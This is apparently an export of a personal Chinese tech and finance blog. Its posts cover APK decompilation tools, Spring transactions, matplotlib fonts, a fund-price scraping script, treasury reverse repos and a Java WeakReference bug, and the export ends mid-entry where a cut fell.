        <content type="html"><![CDATA[<p>因为我老是记不住在 Mac 下面的名字是 d2j-dex2jar。😓</p><h3 id="反编译代码的工具"><a href="#反编译代码的工具" class="headerlink" title="反编译代码的工具"></a>反编译代码的工具</h3><ul><li>dex2jar<ul><li>把 dex 文件转成 jar 文件</li><li>下载地址： <a href="https://sourceforge.net/projects/dex2jar/files/">https://sourceforge.net/projects/dex2jar/files/</a></li></ul></li><li>jd-gui<ul><li>这个工具用于将 jar 文件转换成 java 代码</li><li>下载地址： <a href="http://jd.benow.ca/">http://jd.benow.ca/</a></li></ul></li></ul><span id="more"></span><h3 id="反编译资源的工具"><a href="#反编译资源的工具" class="headerlink" title="反编译资源的工具"></a>反编译资源的工具</h3><ul><li>APKTool: 本文重要工具，APK 逆向工具，使用简单<ul><li>下载地址: <a href="http://ibotpeaches.github.io/Apktool/install/">http://ibotpeaches.github.io/Apktool/install/</a></li></ul></li></ul><h3 id="反编译代码-x2F-资源"><a href="#反编译代码-x2F-资源" class="headerlink" title="反编译代码&#x2F;资源"></a>反编译代码&#x2F;资源</h3><p>dex2jar 和 windows 上面的不太一样，对应为 d2j-dex2jar，所以执行的时候是，<code>sh d2j-dex2jar.sh classes.dex</code>。如果<code>d2j-dex2jar.sh</code>没有在 path 里面，需要写全路径或者加入到 path 变量中。</p><ul><li>sh d2j-dex2jar.sh classes.dex</li><li>sh apktool.sh apktool d FooApp.apk</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yuer@172-12-1-29.lightspeed.sgnwmi.sbcglobal.net:/usr/local/Cellar/dex2jar/2.0&gt; ll bin                                                                                                                                                                            16-12-06 9:41</span><br><span class="line">total 80</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    26B 11 23 14:32 d2j-baksmali -&gt; ../libexec/d2j-baksmali.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    40B 11 23 14:32 d2j-dex-recompute-checksum -&gt; ../libexec/d2j-dex-recompute-checksum.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    25B 11 23 14:32 d2j-dex2jar -&gt; ../libexec/d2j-dex2jar.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    27B 11 23 14:32 d2j-dex2smali -&gt; ../libexec/d2j-dex2smali.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    25B 11 23 14:32 d2j-jar2dex -&gt; ../libexec/d2j-jar2dex.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    28B 11 23 14:32 d2j-jar2jasmin -&gt; ../libexec/d2j-jar2jasmin.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    28B 11 23 14:32 d2j-jasmin2jar -&gt; ../libexec/d2j-jasmin2jar.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    23B 11 23 14:32 d2j-smali -&gt; ../libexec/d2j-smali.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    25B 11 23 14:32 d2j-std-apk -&gt; ../libexec/d2j-std-apk.sh</span><br><span class="line">lrwxr-xr-x  1 yuer  admin    24B 11 23 14:32 d2j_invoke -&gt; ../libexec/d2j_invoke.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring transaction 事务 -- Isolation &amp; Progation</title>
      <link href="/2016/11/27/Spring%20transaction%20%E4%BA%8B%E5%8A%A1%20--%20Isolation%20&amp;%20Progation/"/>
      <url>/2016/11/27/Spring%20transaction%20%E4%BA%8B%E5%8A%A1%20--%20Isolation%20&amp;%20Progation/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>属性</th><th>类型</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td>propagation</td><td>Propagation枚举</td><td>REQUIRED</td><td>事务传播属性 (下有说明)</td></tr><tr><td>isolation</td><td>isolation枚举</td><td>DEFAULT</td><td>事务隔离级别 (另有说明)</td></tr><tr><td>readOnly</td><td>boolean</td><td>false</td><td>是否只读</td></tr><tr><td>timeout</td><td>int</td><td>-1</td><td>超时(秒)</td></tr><tr><td>rollbackFor</td><td>Class[]</td><td>{}</td><td>需要回滚的异常类</td></tr><tr><td>rollbackForClassName</td><td>String[]</td><td>{}</td><td>需要回滚的异常类名</td></tr><tr><td>noRollbackFor</td><td>Class[]</td><td>{}</td><td>不需要回滚的异常类</td></tr><tr><td>noRollbackForClassName</td><td>String[]</td><td>{}</td><td>不需要回滚的异常类名</td></tr></tbody></table><span id="more"></span><p><font color=red><strong>注意:</strong></font></p><ul><li><p>@Transactional 只能被应用到public方法上, 对于其它非public的方法,如果标记了@Transactional也不会报错,但方法没有事务功能。</p></li><li><p>默认情况下,一个有事务方法, 遇到RuntiomeException时会回滚。遇到受检查的异常是不会回滚的。要想所有异常都回滚,要加上rollbackFor&#x3D;{Exception.class}。</p></li></ul><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>REQUIRED</td><td>业务方法需要在一个事务中运行,如果方法运行时,已处在一个事务中,那么就加入该事务,否则自己创建一个新的事务.这是spring默认的传播行为.</td></tr><tr><td>SUPPORTS</td><td>如果业务方法在某个事务范围内被调用,则方法成为该事务的一部分,如果业务方法在事务范围外被调用,则方法在没有事务的环境下执行.</td></tr><tr><td>MANDATORY</td><td>只能在一个已存在事务中执行,业务方法不能发起自己的事务,如果业务方法在没有事务的环境下调用,就抛异常</td></tr><tr><td>REQUIRES_NEW</td><td>业务方法总是会为自己发起一个新的事务,如果方法已运行在一个事务中,则原有事务被挂起,新的事务被创建,直到方法结束,新事务才结束,原先的事务才会恢复执行.</td></tr><tr><td>NOT_SUPPORTED</td><td>声明方法需要事务,如果方法没有关联到一个事务,容器不会为它开启事务.如果方法在一个事务中被调用,该事务会被挂起,在方法调用结束后,原先的事务便会恢复执行.</td></tr><tr><td>NEVER</td><td>声明方法绝对不能在事务范围内执行,如果方法在某个事务范围内执行,容器就抛异常.只有没关联到事务,才正常执行.</td></tr><tr><td>NESTED</td><td>如果一个活动的事务存在,则运行在一个嵌套的事务中.如果没有活动的事务,则按REQUIRED,属性执行.它使用了一个单独的事务, 这个事务拥有多个可以回滚的保证点.内部事务回滚不会对外部事务造成影响, 它只对DataSourceTransactionManager 事务管理器起效.</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> 事务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python matplotlib中文显示问题</title>
      <link href="/2016/11/15/python%20matplotlib%E4%B8%AD%E6%96%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/"/>
      <url>/2016/11/15/python%20matplotlib%E4%B8%AD%E6%96%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>Python中的matplotlib仅支持Unicode编码，默认是不显示中文的，如果让其默认显示中文，可进行如下配置：<span id="more"></span></p><ol><li><p>在python的安装目录中找到配置文件： %Python_Home%\Lib\site-packages\matplotlib\mpl-data\matplotlibrc。如果找不到目录，在pycharm里面点击代码引用也可以发现目录。</p></li><li><p>找到139行的font.family : sans-serif将其前面的#注释去掉</p></li><li><p>找到151行的font.sans-serif : <font color=red><strong>AR PL UMing CN, SimHei,</strong> </font> Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif将【<font color=red><strong>AR PL UMing CN, SimHei</strong></font>】添加在最前面，其中AR PL UMing CN代表：宋体。SimHei代表：黑体。并将前面的#注释号去掉，重启编辑器后，便可显示中文了。</p></li><li><p>同时需要更改axes.unicode_minus  : False；使其值为False；否则无法显示负号</p></li><li><p>代码如下：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line">plt.xlabel(<span class="string">&#x27;x轴&#x27;</span>) </span><br><span class="line">plt.ylabel(<span class="string">&#x27;y轴&#x27;</span>) </span><br><span class="line">plt.bar(left = (<span class="number">0</span>,<span class="number">1</span>),height =(<span class="number">1</span>,<span class="number">0.5</span>),width = <span class="number">0.35</span>) </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/assets/images/matplotlib_display_chinese.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xcode8 Use Legacy Swift Language Version的错误解决</title>
      <link href="/2016/11/04/Xcode8%20Use%20Legacy%20Swift%20Language%20Version%E7%9A%84%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"/>
      <url>/2016/11/04/Xcode8%20Use%20Legacy%20Swift%20Language%20Version%E7%9A%84%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>升级监控iOS程序，因为用到了Charts这个swift库，恰好前段时间升级系统Xcode也升级了。</p><blockquote><p>“Use Legacy Swift Language Version” (SWIFT_VERSION) is required to be configured correctly for targets which use Swift. Use the [Edit &gt; Convert &gt; To Current Swift Syntax…] menu to choose a Swift version or use the Build Settings editor to configure the build setting directly.</p></blockquote><p>设置 对应的SWIFT_VERSION &#x3D; NO 可成。</p><p><img src="/assets/images/SWIFT_VERSION_SETTING.png"></p><p>参考 <a href="http://blog.csdn.net/u012847940/article/details/52229485">http://blog.csdn.net/u012847940/article/details/52229485</a></p>]]></content>
      
      
      <categories>
          
          <category> iOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些年踩过的坑之sed和gsed</title>
      <link href="/2016/10/25/%E9%82%A3%E4%BA%9B%E5%B9%B4%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91%E4%B9%8Bsed%E5%92%8Cgsed/"/>
      <url>/2016/10/25/%E9%82%A3%E4%BA%9B%E5%B9%B4%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91%E4%B9%8Bsed%E5%92%8Cgsed/</url>
      
        <content type="html"><![CDATA[<p>偶然间翻开多年前写过的一个python脚本，恍如昨日～</p><p>这个小程序是用来抓取基金的实时估值数据，然后配置好数量和金额，这样可以盘中大概计算出收益率。</p><p>这个小程序是在Mac上的，所以里面的sed换成了gsed，不然一直要报错。</p><p>还有一个是否生成额外副本的情况，这个个人用的比较少。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    array = []</span><br><span class="line">    config = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        [</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;001421&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:3805.26,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;nanfanglianghua&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:5000</span></span><br><span class="line"><span class="string">            &#125;,&#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;519983&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:8709.51,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;changxinlianghua&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:20000</span></span><br><span class="line"><span class="string">            &#125;,&#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;519712&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:4272.58,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;jiaoyinAlpha&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:10000</span></span><br><span class="line"><span class="string">            &#125;,&#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;340009&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:3734.21,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;quanxinzhaiquan&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:5000</span></span><br><span class="line"><span class="string">            &#125;,&#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;110003&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:4951.41,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;yifangda50&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:5000</span></span><br><span class="line"><span class="string">            &#125;,&#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;020003&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:7063.66,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;guotaijinlong&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:5000</span></span><br><span class="line"><span class="string">            &#125;,&#123;</span></span><br><span class="line"><span class="string">                &quot;stock&quot;:&quot;001039&quot;,</span></span><br><span class="line"><span class="string">                &quot;amount&quot;:12015.67,</span></span><br><span class="line"><span class="string">                &quot;name&quot;:&quot;jiashixianjin&quot;,</span></span><br><span class="line"><span class="string">                &quot;cost&quot;:10000</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    stocks = json.loads(config)</span><br><span class="line"></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Calculation of earnings...&#x27;</span></span><br><span class="line">    os.system(<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> stock <span class="keyword">in</span> stocks:</span><br><span class="line">        cmd = <span class="string">&quot;curl -s  http://fund.eastmoney.com/%s.html?spm=aladin | gsed &#x27;s/div/\\n/g&#x27; | gsed &#x27;s/span/\\n/g&#x27;| grep gz_gsz | gsed &#x27;s/&gt;/ /g&#x27; | gsed &#x27;s/&lt;/ /g&#x27; | grep large | awk &#x27;&#123;print $5&#125;&#x27;&quot;</span> % stock[<span class="string">&#x27;stock&#x27;</span>]</span><br><span class="line">result = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">result = result.strip()</span><br><span class="line">now = <span class="built_in">float</span>(result)*stock[<span class="string">&#x27;amount&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Code: %s , Price: %s , Amount: %s , Total: %s , Percent: %s&#x27;</span> % (stock[<span class="string">&#x27;stock&#x27;</span>] , result , stock[<span class="string">&#x27;amount&#x27;</span>] , now , (now - stock[<span class="string">&#x27;cost&#x27;</span>] ) / stock[<span class="string">&#x27;cost&#x27;</span>])</span><br><span class="line"></span><br><span class="line">total = total + <span class="built_in">float</span>(result)*stock[<span class="string">&#x27;amount&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Total : %s &quot;</span> % total</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>参考地址 <a href="https://stackoverflow.com/questions/10748453/replace-comma-with-newline-in-sed/28773445">https://stackoverflow.com/questions/10748453/replace-comma-with-newline-in-sed/28773445</a></li><li><a href="http://superuser.com/questions/307165/newlines-in-sed-on-mac-os-x">http://superuser.com/questions/307165/newlines-in-sed-on-mac-os-x</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>投资的Daily Checklist</title>
      <link href="/2016/10/19/%E6%8A%95%E8%B5%84%E7%9A%84Daily%20Checklist/"/>
      <url>/2016/10/19/%E6%8A%95%E8%B5%84%E7%9A%84Daily%20Checklist/</url>
      
        <content type="html"><![CDATA[<ul><li>人民币兑美元汇率 <a href="http://finance.sina.com.cn/money/forex/hq/USDCNY.shtml">http://finance.sina.com.cn/money/forex/hq/USDCNY.shtml</a></li><li>融资融卷余额走势图 <a href="http://data.10jqka.com.cn/market/rzrq/">http://data.10jqka.com.cn/market/rzrq/</a></li><li>昨夜外盘涨跌</li><li>Shibor隔夜拆借利率走势 <a href="http://value500.com/Shibor.asp">http://value500.com/Shibor.asp</a></li><li>交易结算资金余额走势图</li><li>A股历史平均市盈率走势图 , 如果市场异常活跃和异常惨淡需要参考该值</li><li>M1M2走势图，大概每月20号左右发布，关注剪刀手和房价走势。平衡资产配置</li><li>value500的指数百科 <a href="http://value500.com/volv500.html">http://value500.com/volv500.html</a></li><li>同花顺数据中心 <a href="http://data.10jqka.com.cn/macro/cpi/">http://data.10jqka.com.cn/macro/cpi/</a></li></ul><p>暂时想到这么多，后续增加</p>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 投资 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>投资反思2016年10月19日写</title>
      <link href="/2016/10/18/%E6%8A%95%E8%B5%84%E5%8F%8D%E6%80%9D2016%E5%B9%B410%E6%9C%8819%E6%97%A5%E5%86%99/"/>
      <url>/2016/10/18/%E6%8A%95%E8%B5%84%E5%8F%8D%E6%80%9D2016%E5%B9%B410%E6%9C%8819%E6%97%A5%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>自2014年入市以来，2015年股灾中离开。空仓也有一年有余。</p><p>股灾打击很大，反思很多。之后变忘了股票这回事，安心的写代码。</p><p>这一年在资金方面做的最失败的莫过于把资金沉淀下来，没有去做任何的投资，单纯放在余额宝，对房市理解不透，错过房价大涨。可悲矣。</p><p>任何时候都不能忘记投资，投资是一辈子的事情，anytime。纵然熊市也有相应的策略，一定不能让资金固定在那儿。分级基金套利／分级A投资／房市…</p><p>2016年10月1日，人民币加入SDR，国庆假期各城市限购政策，到今天两周多了，人民币一直在跌，楼市一线城市量价齐跌。</p><p>于是乎，资金们，流动起来吧～</p>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 投资 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国债逆回购</title>
      <link href="/2016/09/27/%E5%9B%BD%E5%80%BA%E9%80%86%E5%9B%9E%E8%B4%AD/"/>
      <url>/2016/09/27/%E5%9B%BD%E5%80%BA%E9%80%86%E5%9B%9E%E8%B4%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是国债逆回购"><a href="#什么是国债逆回购" class="headerlink" title="什么是国债逆回购"></a>什么是国债逆回购</h1><p>所谓国债逆回购，本质就是一种短期贷款，也就是说，个人通过国债回购市场把自己的资金借出去，获得固定的利息收益；而回购方，也就是借款人用自己的国债作为抵押获得这笔借款，到期后还本付息。通俗来讲，就是将资金通过国债回购市场拆出，其实就是一种短期贷款，即你把钱借给别人，获得固定利息；而别人用国债作抵押，到期还本付息。逆回购的安全性超强，等同于国债。</p><p>简单来说，国债逆回购有三方参与者：</p><ul><li>融资方 即正回购方，需要用手中的国债券换取现金；</li><li>融券方 即逆回购方，需要用手中的现金买国债券，以实现资金增值；</li><li>监督方 上交所和深交所</li></ul><span id="more"></span><h1 id="交易门槛高吗-–-沪市-10W-起，深市-1K-起"><a href="#交易门槛高吗-–-沪市-10W-起，深市-1K-起" class="headerlink" title="交易门槛高吗 – 沪市 10W 起，深市 1K 起"></a>交易门槛高吗 – 沪市 10W 起，深市 1K 起</h1><h2 id="沪市的门槛"><a href="#沪市的门槛" class="headerlink" title="沪市的门槛"></a>沪市的门槛</h2><ul><li>起手：1000 元为一手，100 手起，即至少准备 10 万元</li><li>封顶：10 万的整数倍申购，最高不超过 1000 万。</li></ul><h2 id="深市的门槛"><a href="#深市的门槛" class="headerlink" title="深市的门槛"></a>深市的门槛</h2><ul><li>起手低：1000 元一手，一手起</li><li>封顶：无。1000 的整倍数递增，没有最高限额。</li></ul><h1 id="收益如何-–-略高于一年期存款利率"><a href="#收益如何-–-略高于一年期存款利率" class="headerlink" title="收益如何 – 略高于一年期存款利率"></a>收益如何 – 略高于一年期存款利率</h1><p>既然都是闲置资金实现增值的方法，那么究竟逆回购的收益率如何呢？相对于银行存款利率呢？</p><p>逆回购全年年化收益在 <code>3% ～ 5%</code> ，略高于一年期存款利率，但也有可能会出现突然间的利率猛增，如果出现 &gt; 10% 这样的年化收益，赶紧买。</p><p>收益计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">收益=本金*交易价格（即利率）/365*回购天数-本金*佣金费率</span><br></pre></td></tr></table></figure><p>假设小明现在有 1 万元闲置资金，按照 5% 利率进行 7 天逆回购，忽略佣金，最终收益是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y=10000*5%*7/365=9.58元</span><br></pre></td></tr></table></figure><h1 id="佣金水平-–-很低"><a href="#佣金水平-–-很低" class="headerlink" title="佣金水平 – 很低"></a>佣金水平 – 很低</h1><p>国债一、二、三、四天回购佣金水平为 10 万元一天一元；<br>七天回购，10 万元每笔 5 元；<br>十四天回购，10 万元每笔 10 元；<br>二十八天回购，10 万元每笔 20 元；<br>二十八天以上回购，10 万元每笔 30 元封顶。</p><p>佣金通常介于收益的 4%至 6%之间。</p><h1 id="风险高吗-–-基本等同于国债"><a href="#风险高吗-–-基本等同于国债" class="headerlink" title="风险高吗 – 基本等同于国债"></a>风险高吗 – 基本等同于国债</h1><p>逆回购的风险非常低，基本等同于国债。</p><p>一旦成交，对方的国债就会被都冻结，约定的时间一到，证券交易所就会自动把本金加利息划到你的账户中。对于散户而言，其所进行逆回购的交易对手是结算中心，融资方到期不能按时还款，结算公司会先垫付资金，所以风险非常低。</p><h1 id="回购品种"><a href="#回购品种" class="headerlink" title="回购品种"></a>回购品种</h1><h2 id="上交所回购品种"><a href="#上交所回购品种" class="headerlink" title="上交所回购品种"></a>上交所回购品种</h2><table><thead><tr><th>名称</th><th>代码</th><th>简称</th></tr></thead><tbody><tr><td>1 天国债回购</td><td>GC001</td><td>204001</td></tr><tr><td>2 天国债回购</td><td>GC002</td><td>204002</td></tr><tr><td>3 天国债回购</td><td>GC003</td><td>204003</td></tr><tr><td>4 天国债回购</td><td>GC004</td><td>204004</td></tr><tr><td>7 天国债回购</td><td>GC007</td><td>204007</td></tr><tr><td>14 天国债回购</td><td>GC014</td><td>204014</td></tr><tr><td>28 天国债回购</td><td>GC028</td><td>204028</td></tr><tr><td>91 天国债回购</td><td>GC091</td><td>204091</td></tr><tr><td>182 天国债回购</td><td>GC182</td><td>204182</td></tr></tbody></table><h2 id="深交所回购品种"><a href="#深交所回购品种" class="headerlink" title="深交所回购品种"></a>深交所回购品种</h2><table><thead><tr><th>名称</th><th>代码</th><th>简称</th></tr></thead><tbody><tr><td>1 天国债回购</td><td>R-001</td><td>131810</td></tr><tr><td>2 天国债回购</td><td>R-002</td><td>131811</td></tr><tr><td>3 天国债回购</td><td>R-003</td><td>131800</td></tr><tr><td>4 天国债回购</td><td>R-004</td><td>131809</td></tr><tr><td>7 天国债回购</td><td>R-007</td><td>131801</td></tr><tr><td>14 天国债回购</td><td>R-014</td><td>131802</td></tr><tr><td>28 天国债回购</td><td>R-028</td><td>131803</td></tr><tr><td>91 天国债回购</td><td>R-091</td><td>131805</td></tr><tr><td>182 天国债回购</td><td>R-182</td><td>131806</td></tr></tbody></table><p><img src="/assets/images/GC007_20160928.png"></p>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 国债 </tag>
            
            <tag> 逆回购 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WeakReference的一小记</title>
      <link href="/2016/09/21/WeakReference%E7%9A%84%E4%B8%80%E5%B0%8F%E8%AE%B0/"/>
      <url>/2016/09/21/WeakReference%E7%9A%84%E4%B8%80%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近要做一个功能，白名单配置，采用了一个叫做FileMonitor的工具，源码参看链接。新版本JDK是可以用WatchServices来监听文件变化。</p><ul><li><a href="http://geosoft.no/software/filemonitor/FileMonitor.java.html">FileMonitor.java</a></li><li><a href="http://geosoft.no/software/filemonitor/FileListener.java.html">FileListener.java</a></li></ul><p><strong>坑</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Application 已实现了FileListener 的fileChanged 接口，这是错误写法</span></span><br><span class="line"><span class="type">FileMonitor</span> <span class="variable">monitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileMonitor</span>(<span class="number">1000</span>);</span><br><span class="line">monitor.addFile(<span class="keyword">new</span> <span class="title class_">File</span>(Application.class.getResource(<span class="string">&quot;/config/whitelist.ini&quot;</span>).getPath()));</span><br><span class="line">monitor.addListener(<span class="keyword">new</span> <span class="title class_">Application</span>());</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Application 已实现了FileListener 的fileChanged 接口，这是正确写法</span></span><br><span class="line"><span class="type">FileMonitor</span> <span class="variable">monitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileMonitor</span>(<span class="number">1000</span>);</span><br><span class="line">monitor.addFile(<span class="keyword">new</span> <span class="title class_">File</span>(Application.class.getResource(<span class="string">&quot;/config/whitelist.ini&quot;</span>).getPath()));</span><br><span class="line"><span class="type">Application</span> <span class="variable">application</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">monitor.addListener(application);</span><br></pre></td></tr></table></figure><p>程序开始运行的挺好的，文件变动也能及时反馈调用给Listener，但是运行一段时间之后，程序便不再调用Listener回调。费解。阅读FileMonitor源码实现后，发现采用了WeakReference来包装Listener，使得不容易内存泄漏。后来证明这是作者想多了，在作为配置文件Reload这种特性的情况下，一般是不会有很多new 很多个FileMonitor出来的。</p><p>经过初步猜测是由于WeakReference 弱应用导致Listener被GC掉。遂用VisualVM  Dump类证实为GC时被回收。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Application</span> <span class="variable">application</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">monitor.addListener(application);</span><br><span class="line"><span class="comment">// 分割线</span></span><br><span class="line">monitor.addListener(<span class="keyword">new</span> <span class="title class_">Application</span>());</span><br></pre></td></tr></table></figure><p>经过和朋友沟通和自己理解后，认为在new Application()出来的对象的作用域有关。于是将new单独出来，测试后问题解决。</p><p>哎，惭愧</p><ul><li><a 